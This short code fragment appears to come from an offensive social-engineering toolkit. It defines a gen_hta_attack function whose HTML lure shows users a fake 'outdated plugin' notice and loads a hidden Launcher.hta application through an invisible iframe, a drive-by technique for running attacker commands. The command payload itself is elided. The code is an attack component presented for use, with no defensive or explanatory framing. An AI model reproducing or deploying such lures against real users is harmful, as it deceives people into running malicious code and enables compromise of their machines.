...
def gen_hta_attack(command):
    ...
    main2 = """<title>outdated plugin</title><br /><center>Please wait redirecting to download...</center><iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>"""
